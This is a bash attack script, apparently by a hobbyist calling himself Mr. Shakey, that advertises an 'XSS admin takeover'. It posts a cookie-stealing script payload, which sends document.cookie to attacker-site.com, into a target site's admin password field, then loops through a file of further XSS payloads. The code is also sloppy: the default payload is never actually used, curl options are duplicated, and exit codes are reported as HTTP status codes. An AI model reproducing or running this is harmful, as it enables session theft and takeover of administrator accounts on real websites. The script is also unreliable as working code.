#!/bin/bash
show_banner() {
    cat << 'EOF'
    ___       __          _       _  __
   /   | ____/ /___ ___  (_)___  | |/ /
  / /| |/ __  / __ `__ \/ / __ \ |   / 
 / ___ / /_/ / / / / / / / / / //   |  
/_/  |_\__,_/_/ /_/ /_/_/_/ /_//_/|_|  
                                      
═══════════════════════════════════════
    A D M I N I S T R A T I O N   
         T O O L   S U I T E        
═══════════════════════════════════════
              by mr.shakey
EOF
}

show_banner
# XSS Admin Takeover Script
# By: Mr. Shakey

# Configuration
DEFAULT_PAYLOAD="<script>document.location='https://attacker-site.com/steal?cookie='+document.cookie;</script>"
COOKIE_FILE="/tmp/xss_cookie.txt"
LOG_FILE="/tmp/xss_attack.log"
TEMP_DIR="/tmp/xss_attack"
VULN_FILE="/tmp/vulnerabilities.txt"
XSS_PAYLOADS_FILE="/tmp/xss_payloads.txt"

# Help function
show_help() {
    echo "Usage: $0 [options]"
    echo "Options:"
    echo "  -u, --url       Target URL (default: $TARGET_URL)"
    echo "  -p, --payload   Custom XSS payload (default: $DEFAULT_PAYLOAD)"
    echo "  -c, --cookie    Cookie file path (default: $COOKIE_FILE)"
    echo "  -l, --log       Log file path (default: $LOG_FILE)"
    echo "  -d, --dir       Temporary directory (default: $TEMP_DIR)"
    echo "  -v, --vuln      Vulnerabilities file path (default: $VULN_FILE)"
    echo "  -x, --xss       XSS payloads file path (default: $XSS_PAYLOADS_FILE)"
    echo "  -h, --help      Show this help message"
}

# Create temporary directory
mkdir -p $TEMP_DIR

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            TARGET_URL="$2"
            shift 2
            ;;
        -p|--payload)
            PAYLOAD="$2"
            shift 2
            ;;
        -c|--cookie)
            COOKIE_FILE="$2"
            shift 2
            ;;
        -l|--log)
            LOG_FILE="$2"
            shift 2
            ;;
        -d|--dir)
            TEMP_DIR="$2"
            mkdir -p $TEMP_DIR
            shift 2
            ;;
        -v|--vuln)
            VULN_FILE="$2"
            shift 2
            ;;
        -x|--xss)
            XSS_PAYLOADS_FILE="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            TARGET_URL="$1"
            shift
            ;;
    esac
done

# Validate inputs
if [ -z "$TARGET_URL" ]; then
    read -p "Enter target URL: " TARGET_URL
    if [ -z "$TARGET_URL" ]; then
        echo "[!] Target URL cannot be empty"
        exit 1
    fi
fi

# Execute attack
echo "[+] Starting XSS attack against $TARGET_URL" | tee -a $LOG_FILE

curl -s -i -X POST $TARGET_URL \
  -d "username=admin" \
  -d "password=$PAYLOAD" \
  -w '%{http_code}' \
  -s -o $COOKIE_FILE \
  -w '%{http_code}' \
  -s -o $COOKIE_FILE

if [ $? -eq 0 ]; then
    echo "[+] Attack completed successfully" | tee -a $LOG_FILE
    echo "[+] Cookies saved to $COOKIE_FILE" | tee -a $LOG_FILE
    
    # Check for vulnerabilities
    grep -i "error\|warning\|exception\|fail\|vulnerable" $COOKIE_FILE > $VULN_FILE
    if [ -s "$VULN_FILE" ]; then
        echo "[+] Vulnerabilities detected! Saved to $VULN_FILE" | tee -a $LOG_FILE
    else
        echo "[+] No obvious vulnerabilities detected." | tee -a $LOG_FILE
    fi
    
    # Check for XSS vulnerabilities using payloads
    if [ -f "$XSS_PAYLOADS_FILE" ]; then
        echo "[+] Testing XSS payloads..." | tee -a $LOG_FILE
        while read -r payload; do
            curl -s -i -X POST $TARGET_URL \
                -d "username=admin" \
                -d "password=$payload" \
                -w '%{http_code}' \
                -s -o $COOKIE_FILE \
                -w '%{http_code}' \
                -s -o $COOKIE_FILE
            
            if [ $? -ne 0 ]; then
                echo "[+] Payload '$payload' caused error!" | tee -a $LOG_FILE
            fi
        done < "$XSS_PAYLOADS_FILE"
    else
        echo "[!] XSS payloads file not found." | tee -a $LOG_FILE
    fi
else
    echo "[!] Attack failed with HTTP status code $?" | tee -a $LOG_FILE
fi

# Clean up
rm -rf $TEMP_DIR

echo "[+] Attack completed" | tee -a $LOG_FILE

# Confirm log file location
echo "[+] Log file saved to: $LOG_FILE"